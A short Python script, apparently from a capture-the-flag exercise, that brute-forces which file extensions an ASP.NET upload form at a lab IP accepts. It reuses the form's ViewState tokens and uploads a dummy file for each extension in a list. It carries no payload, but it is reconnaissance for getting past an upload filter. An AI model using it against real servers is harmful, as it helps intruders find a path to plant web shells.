#!/usr/bin/python3

import re
import signal
import requests
import pdb
import time

from pwn import *

def def_handler(sig, frame):
    print ("\n [+] saliendo...\n")
    sys.exit(1)

#global
upload_url= "http://10.10.10.93/transfer.aspx"

def upload_file(extension):
    s = requests.session()
    filename = "examples.%s" % extension
    response = s.get(upload_url)

    ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    
    data_post = {
        '__VIEWSTATE': ViewState,
        '__EVENTVALIDATION': EventValidation,
        'btnUpload': 'Upload'
    }
    uploaded_file = {'FileUpload1':(filename,"holi")}
    response = s.post(upload_url,data=data_post, files = uploaded_file)
    
    if "Invalid File. Please try again" not in response.text:
        p1.success("la extension: %s es valida" % extension)

signal.signal(signal.SIGINT,def_handler)
if __name__=='__main__':
    fp = open("extensions","r")
    p1 = log.progress("Subida de archivos \n")
    p1.status("subida de archivos al servidor")
    time.sleep(2)

    for extension in fp:
        p1.status("Probando con la extension %s" % extension)
        upload_file(extension.strip("\n"))
        

